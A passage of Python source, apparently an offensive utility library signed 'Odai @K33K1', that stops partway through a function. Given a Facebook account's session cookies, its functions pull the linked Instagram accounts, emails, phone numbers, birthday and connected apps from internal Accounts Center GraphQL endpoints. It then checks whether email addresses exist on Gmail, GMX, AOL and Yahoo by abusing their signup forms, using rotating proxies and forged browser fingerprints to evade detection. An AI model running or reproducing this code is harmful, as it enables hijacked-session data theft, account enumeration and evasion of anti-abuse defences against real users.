                info['name'] = title_tag.text.strip() if title_tag else None
                og_title = soup.find('meta', property='og:title')
                og_desc = soup.find('meta', property='og:description')
                info['description'] = og_desc.get('content') if og_desc else None
                og_image = soup.find('meta', property='og:image')
                info['profile_image'] = og_image.get('content') if og_image else None
                og_url = soup.find('meta', property='og:url')
                info['profile_url'] = og_url.get('content') if og_url else None
                android_url = soup.find('meta', property='al:android:url')
                if android_url:
                    a_url = android_url.get('content', '')
                    info['user_id'] = a_url.split('profile/')[-1] if 'profile/' in a_url else None
                else:info['user_id'] = None
                canonical = soup.find('link', rel='canonical')
                if canonical:
                    href = canonical.get('href', '')
                    if 'facebook.com/' in href:
                        van = href.split('facebook.com/')[-1].rstrip('/')
                        if 'profile.php?id=' in van:info['username'] = van.split('id=')[-1]
                        else:info['username'] = van
                    else:info['username'] = None
                else:info['username'] = None
                for key in info:
                    if info[key] == '':info[key] = None
                result = {"status": "success", "data": info}
                result['Dev'] = Dev
                return result
            except Exception as e:
                return {"status": "error", "error": str(e), "data": None, "Dev": Dev}
        @staticmethod
        def info(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            ps_l = cookies_dict.get("ps_l")
            ps_n = cookies_dict.get("ps_n")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': '656x838', 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '26102210629377215'}
            response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
            response = response.replace("for (;;);", "")
            js = json.loads(response)
            result = {"facebook_name": js["data"]["fxim_identity_for_id"]["full_name"],"instagram_accounts": []}
            identities = js["data"]["fx_identity_management"]["identities_and_central_identities"]["linked_identities_to_pci"]
            for acc in identities:
                if acc["detailed_identity_type"] == "IG_PERSONAL":
                    ig_id = acc["canonical_id"]
                    data["variables"] = json.dumps({"identity_id": ig_id,"interface": "FB_WEB","platform": "INSTAGRAM","scale": 1})
                    try:
                        ig_response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
                        ig_response = ig_response.replace("for (;;);", "")
                        ig_json = json.loads(ig_response)
                        ig_data = ig_json["data"]["fxim_identity_for_id"]
                        if ig_id and ig_data:result["instagram_accounts"].append({"id": ig_id,"username": ig_data["username"],"full_name": ig_data["full_name"],"profile_picture": ig_data["profile_picture_info"]["profile_picture_url"],"Dev": "Odai @K33K1"})
                        else:result = {"status": "false","msg": "No data","Dev": "Odai @K33K1"}
                    except Exception as e:result = {"status": " error","error": e,"Dev": "Odai @K33K1"}
            return result
        @staticmethod
        def contact(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': wd, 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '24467941749567966'}
            response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
            js = json.loads(response.replace("for (;;);",""))
            node = js["data"]["fxcal_settings"]["node"]
            contacts = node["all_contact_points"]
            if contacts: 
                result = {"emails": [],"phones": [], "Dev": "Odai @K33K1"}
                for c in contacts:
                    if c["contact_point_type"] == "EMAIL":result["emails"].append(c["normalized_contact_point"])
                    if c["contact_point_type"] == "PHONE_NUMBER":result["phones"].append(c["normalized_contact_point"])
            else:result = {"status": "false","msg": "No data","Dev": "Odai @K33K1"}
            return result
        @staticmethod
        def birthday(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': wd, 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterBirthdayRootQuery', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterBirthdayRootQuery', 'server_timestamps': 'true', 'variables': '{"interface":"FB_WEB","node":"BIRTHDAY"}', 'doc_id': '26426848043589913'}
            response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
            response = response.replace("for (;;);","")
            js = json.loads(response)
            birthday = js["data"]["fxcal_settings"]["node"]["birthday"]
            if birthday:return {"status": "true","birthday": birthday,"Dev": "Odai @K33K1"}
            else:return {"status": "invaild", "msg": "Can't Extract The Birthday, Check Your Cookies or Account" , "Dev": "Odai @K33K1"}
    class tools:
        class apps:
            @staticmethod
            def get_linked_apps(cookies_input):
                session = requests.Session()
                if isinstance(cookies_input, dict):coki = cookies_input
                elif isinstance(cookies_input, str):
                    coki = {}
                    cleaned = ';'.join([p.strip() for p in cookies_input.split(';') if p.strip()])
                    for part in cleaned.split(';'):
                        if '=' not in part:continue
                        key, val = part.split('=', 1)
                        coki[key.strip()] = val.strip()
                else:return {"status": "false","msg": "error in cookies format", "Dev": "Odai @K33K1"}
                ua = 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Safari/420+'
                headers = {'user-agent': ua}
                try:rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headers, timeout=12).text
                except:rr1 = ""
                try:rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headers, timeout=12).text
                except:rr2 = ""
                output = []
                if 'tidak memiliki aplikasi' in rr1.lower() or 'no active apps' in rr1.lower():output.append("No active apps")
                else:
                    apps_active = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
                    dates_active = re.findall(r'(?:تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia)\s*([^<]+)</p>', rr1)
                    if not apps_active:output.append("No active apps found")
                    else:
                        for i, app in enumerate(apps_active):
                            app_clean = app.strip()
                            try:date_clean = dates_active[i].strip()
                            except IndexError:date_clean = "غير معروف"
                            output.append(f"[{i+1}] {app_clean} - {date_clean}")
                lower_rr2 = rr2.lower()
                if 'kedaluwarsa' in lower_rr2 and 'tidak memiliki' in lower_rr2:output.append("No inactive/expired apps")
                else:
                    apps_inactive = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
                    dates_raw = re.findall(r'<p[^>]*>(?:Kedaluwarsa pada|انتهت الصلاحية في|منتهية الصلاحية في|Expired on)[^<]*</p>', rr2)
                    dates_inactive = [re.sub(r'<[^>]+>', '', d).strip() for d in dates_raw]
                    if not apps_inactive:output.append("No inactive/expired apps found")
                    else:
                        for i, app in enumerate(apps_inactive):
                            app_clean = app.strip()
                            try:date_clean = dates_inactive[i].strip()
                            except IndexError:date_clean = "غير معروف"
                            output.append(f"[{i+1}] {app_clean} - {date_clean}")
                if not output:output.append("لا توجد بيانات متاحة")
                return output
class checkems:
    @staticmethod
    def gmail(email, proxies=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        proxy = proxies if proxies else None

        try:
            if "@" in email:email = email.split("@")[0]

            TL = None
            __Host_GAPS = None
            base_url = 'https://accounts.google.com/_/signup'
            headers = {
                'user-agent': generate_user_agent(),
                'google-accounts-xsrf': '1',
            }

            url = base_url + '/validatepersonaldetails'
            params = {
                'hl': "ar",
                '_reqid': "74404",
                'rt': "j"
            }
            payload = {
                'f.req': "[\"AEThLlymT9V_0eW9Zw42mUXBqA3s9U9ljzwK7Jia8M4qy_5H3vwDL4GhSJXkUXTnPL_roS69KYSkaVJLdkmOC6bPDO0jy5qaBZR0nGnsWOb1bhxEY_YOrhedYnF3CldZzhireOeUd-vT8WbFd7SXxfhuWiGNtuPBrMKSLuMomStQkZieaIHlfdka8G45OmseoCfbsvWmoc7U\",\"L7N\",\"ToPython\",\"L7N\",\"ToPython\",0,0,null,null,null,0,null,1,[],1]",
                'deviceinfo': "[null,null,null,null,null,\"IQ\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,1,1,2]",
            }

            __Host_GAPS = ''.join(secrets.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(secrets.randbelow(16) + 15))
            cookies = {'__Host-GAPS': __Host_GAPS}

            response = requests.post(url, cookies=cookies, params=params, data=payload, headers=headers, timeout=10, proxies = Proxy.build(proxies), verify=False)

            if response.status_code != 200:
                return {"status": "error", "msg": "bad response step 1", "Dev": "Odai @K33K1"}

            if '",null,"' not in response.text:
                return {"status": "error", "msg": "failed to extract TL", "Dev": "Odai @K33K1"}

            TL = str(response.text).split('",null,"')[1].split('"')[0]
            __Host_GAPS = response.cookies.get_dict().get('__Host-GAPS')

            url = base_url + '/usernameavailability'
            cookies = {'__Host-GAPS': __Host_GAPS}
            params = {'TL': TL}
            data = {
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '0',
                'flowEntry': 'SignUp',
                'service': 'mail',
                'theme': 'mn',
                'f.req': f'["TL:{TL}","{email}",0,0,1,null,0,5167]',
                'azt': 'AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig:1712322460888',
                'cookiesDisabled': 'false',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn'
            }
            response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data, timeout=10, proxies = Proxy.build(proxies), verify=False)
            if response.status_code == 200:
                if '"gf.uar",1' in response.text:
                    return {"status": "available", "email": email, "Dev": "Odai @K33K1"}
                if '"gf.uar",2' in response.text:return {"status": "taken", "email": email, "Dev": "Odai @K33K1"}
                else:return {"status": "unknown", "email": email, "Dev": "Odai @K33K1"}
            else:return {"status": "error", "msg": "bad response step 2", "Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error", "error": str(e)}
    BASE_COOKIES = {'_externalAdId':'1770222114463','ua_id':'019c2975-d6f1-76f1-a57c-d75b785caf41','_originalReferrer':'www.google.com','euconsent-bypass':'1','wa':'opt-out','NGUserID':'TGP-OPT-OUT','utag_main':'_sn:1$_se:8%3Bexp-session$_ss:0%3Bexp-session$_st:1770223941278%3Bexp-session$ses_id:1770222114477%3Bexp-session$_pn:5%3Bexp-session'}
    BASE_HEADERS = {'authority':'signup.gmx.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9,ar;q=0.8','referer':'https://www.gmx.com/mail/create-email-address/','sec-ch-ua':'"Chromium";v="137", "Not(A:Brand";v="24"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-site','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'}
    @staticmethod
    def _generate_guid() -> str:return str(uuid.uuid4())
    @staticmethod
    def _extract_config(html: str) -> Optional[Dict[str, Any]]:
        pattern = r"<script id='application-config' type='application/json'>\s*(\{.*?\})\s*</script>"
        match = re.search(pattern, html, re.DOTALL)
        if not match:return None
        try:return json.loads(match.group(1))
        except json.JSONDecodeError:return None
    @classmethod
    def _fetch_config(cls, email_alias: str = "test", email_domain: str = "gmx.com", proxies=None) -> Optional[Dict[str, Any]]:
        try:
            use_proxies = proxies
            response = requests.get('https://signup.gmx.com/',params={'emailAlias': email_alias, 'emailDomain': email_domain},cookies=cls.BASE_COOKIES,headers=cls.BASE_HEADERS,proxies=use_proxies,timeout=30)
            if response.status_code != 200:return None
            return cls._extract_config(response.text)
        except:return None
    @classmethod
    def gmx(cls, email: str, proxies=None) -> Tuple[bool, Optional[List[str]]]:
        config = cls._fetch_config(email_alias=email.split('@')[0], proxies=proxies)
        if not config:return False, None
        access_token = config.get('accessToken', '')
        client_guid = config.get('clientCredentialGuid', '')
        if not access_token:return False, None
        headers = {"authority":"register-suggest.gmx.com","accept":"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,ar;q=0.8","authorization":f"Bearer {access_token}","content-type":"application/vnd.ui.mam.suggestion.creation-v1+json","origin":"https://signup.gmx.com","referer":"https://signup.gmx.com/","sec-ch-ua":'"Chromium";v="137", "Not(A:Brand";v="24"',"sec-ch-ua-mobile":"?1","sec-ch-ua-platform":'"Android"',"sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-site","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","x-ccguid":client_guid or cls._generate_guid(),"x-request-id":cls._generate_guid(),"x-ui-app":"@mamdev/umreg.registration-app2/8.37.1"}
        payload = {"emailAddress":email,"firstName":"Odai","lastName":"K33K1","birthDate":"2000-05-09","city":"","countryCode":"US","initialRequestedEmailAddress":"","suggestionProducts":["gmxcomFree"],"maxResultCountToProduct":{"gmxcomFree":"4"},"mdhMaxResultCount":"0","requestedEmailAddressProduct":"gmxcomFree"}
        try:
            response = requests.post("https://register-suggest.gmx.com/rest/email-alias/availability",json=payload,headers=headers,proxies=proxies,timeout=15)
            if response.status_code == 200:
                result = response.json()
                is_available = result.get('emailAddressAvailable', False)
                suggestions = result.get('suggestedEmails', {}).get('gmxcomFree', [])
                return is_available, suggestions if suggestions else None
            else:return False, None
        except:return False, None
    @staticmethod
    def aol(email, proxies=None):
        proxy = proxies if proxies else None
        if '@' in email:aoll = email.split('@')[0]
        else:aoll = email
        s = requests.Session()
        try:
            first_names = ["Liam", "Olivia", "Noah", "Emma", "Ava", "Sophia", "James", "Isabella", "Gabriella", "Mia"]
            last_names = ["Johnson", "Brown", "Davis", "Miller", "Wilson", "Taylor", "Moore", "Collins", "Anderson", "Thomas"]

            first_name = random.choice(first_names)
            last_name = random.choice(last_names)

            chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            password = ''.join(random.choice(chars) for _ in range(12))

            agent = generate_user_agent()

            req = s.get(
                "https://login.aol.com/account/create",
                headers={'User-Agent': agent},
                proxies = Proxy.build(proxies)
            )

            soup = BeautifulSoup(req.text, "html.parser")

            crumb = soup.find("input", {"name": "crumb"}).get("value", "")
            acrumb = soup.find("input", {"name": "acrumb"}).get("value", "")
            sessionIndex = soup.find("input", {"name": "sessionIndex"}).get("value", "")
            asId = soup.find("input", {"name": "asId"}).get("value", "")

            cook = req.cookies.get_dict()

            payload = {
                'specId': "yidregsimplified",
                'context': "REGISTRATION",
                'crumb': crumb,
                'acrumb': acrumb,
                'sessionIndex': sessionIndex,
                'tos0': "oath_freereg|us|en-US",
                'asId': asId,
                'firstName': first_name,
                'lastName': last_name,
                'userid-domain': "yahoo",
                'userId': aoll,
                'password': password,
                'mm': str(random.randint(1, 12)),
                'dd': str(random.randint(1, 28)),
                'yyyy': random.randint(1990, 2002),
                'signup': ""
            }

            headers = {
                'User-Agent': agent,
                'sec-ch-ua-platform': "\"Android\"",
                'x-requested-with': "XMLHttpRequest",
                'sec-ch-ua-mobile': "?1",
                'origin': "https://login.aol.com",
                'referer': "https://login.aol.com/account/create",
                'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
            }

            res = s.post(
                "https://login.aol.com/account/module/create?validateField=userId",
                data=payload,
                headers=headers,
                cookies=cook,
                proxies = Proxy.build(proxies)
            ).text

            if '{"errors":[]}' in res:
                username, domain = email.split('@') if '@' in email else (aoll, "unknown")
                return {
                    "status": "available",
                    "email": email,
                    "Dev": "Odai @K33K1"
                }
            
            else:
                return {
                    "status": "taken",
                   "email": email,
                    "Dev": "Odai @K33K1"
                }

        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "Dev": "Odai @K33K1"
            }
    @staticmethod
    def yahoo(username: str, proxies=None) -> dict:
        Dev = "Odai @K33K1"
        
        try:
            if "@" in username:username = username.split("@")[0]
            session = requests.Session()
            languages = ['en-AU', 'en-US', 'en-GB', 'en-CA', 'en-NZ']
            platforms = ['Win32', 'Win64', 'MacIntel', 'Linux x86_64']
            timezones = [
                ('Asia/Amman', -180),
                ('America/New_York', 300),
                ('Europe/London', 0),
                ('Europe/Berlin', -60),
                ('Asia/Dubai', -240),
                ('America/Chicago', 360),
                ('America/Los_Angeles', 420),
                ('Australia/Sydney', -600),
            ]
            resolutions = [(1920,1080),(1366,768),(1536,864),(1440,900),(2560,1440),(1680,1050),(1280,720),(1600,900),(1920,1200)]
            w, h = random.choice(resolutions)
            resolution = {'w': str(w), 'h': str(h)}
            available_resolution = {'w': str(w), 'h': str(h)}
            colorDepth = random.choice([24,30,32,48])
            deviceMemory = random.choice([4,8,16,32])
            pixelRatio = round(random.choice([1.0,1.25,1.5,2.0,2.5]),2)
            hardwareConcurrency = random.choice([4,8,12,16,20])
            plugins_count = random.choice([3,4,5,6])
            plugins_hash = hashlib.md5(f"plugins_{plugins_count}_{random.random()}".encode()).hexdigest()
            plugins = {'count': plugins_count, 'hash': plugins_hash}
            fonts_count = random.choice([40,45,48,50,55,60])
            fonts_hash = hashlib.md5(f"fonts_{fonts_count}_{random.random()}".encode()).hexdigest()
            fonts = {'count': fonts_count, 'hash': fonts_hash}
            webgl_vendors = [
                ('Google Inc. (Intel)', 'ANGLE (Intel, Intel(R) Graphics (0x00007DD1) Direct3D11 vs_5_0 ps_5_0, D3D11)'),
                ('Google Inc. (NVIDIA)', 'ANGLE (NVIDIA, NVIDIA GeForce GTX (0x00001C03) Direct3D11 vs_5_0 ps_5_0, D3D11)'),
                ('Google Inc. (AMD)', 'ANGLE (AMD, AMD Radeon Graphics (0x000015DD) Direct3D11 vs_5_0 ps_5_0, D3D11)'),
                ('Google Inc. (Intel)', 'ANGLE (Intel, Intel(R) UHD Graphics (0x00009BC4) Direct3D11 vs_5_0 ps_5_0, D3D11)'),
            ]
            vendor, renderer = random.choice(webgl_vendors)
            webglVendorAndRenderer = f"{vendor}~{renderer}"
            canvas_hash = hashlib.md5(f"canvas_{random.random()}_{time.time()}".encode()).hexdigest()
            canvas = f"canvas winding:yes~canvas_{canvas_hash[:8]}"
            audio = str(round(random.uniform(100,150),10))
            has_touch = random.choice([True,False])
            if has_touch:
                points = random.choice([5,10])
                touchSupport = {'points': points, 'event': 1, 'start': 1}
            else:touchSupport = {'points': 0, 'event': 0, 'start': 0}
            language = random.choice(languages)
            platform = random.choice(platforms)
            timezone, offset = random.choice(timezones)
            fingerprint = {
                'webdriver': 0,
                'language': language,
                'colorDepth': colorDepth,
                'deviceMemory': deviceMemory,
                'pixelRatio': pixelRatio,
                'hardwareConcurrency': hardwareConcurrency,
                'timezoneOffset': offset,
                'timezone': timezone,
                'sessionStorage': 1,
                'localStorage': 1,
                'indexedDb': 1,
                'cpuClass': 'unknown',
                'platform': platform,
                'doNotTrack': 'unknown',
                'plugins': plugins,
                'canvas': canvas,
                'webgl': 1,
                'webglVendorAndRenderer': webglVendorAndRenderer,
                'adBlock': 0,
                'hasLiedLanguages': 0,
                'hasLiedResolution': 0,
                'hasLiedOs': 0,
                'hasLiedBrowser': 0,
                'touchSupport': touchSupport,
                'fonts': fonts,
                'fontsFlash': 'swf object not loaded',
                'audio': audio,
                'resolution': resolution,
                'availableResolution': available_resolution,
                'ts': {'render': int(time.time() * 1000) - random.randint(1000,5000)}
            }
            fingerprint_json = json.dumps(fingerprint)
            browser_fp_encoded = urllib.parse.quote(fingerprint_json)
            session.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': f'{fingerprint["language"]},en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6',
                'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': f'"{random.choice(["Windows", "macOS", "Linux"])}"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'user-agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
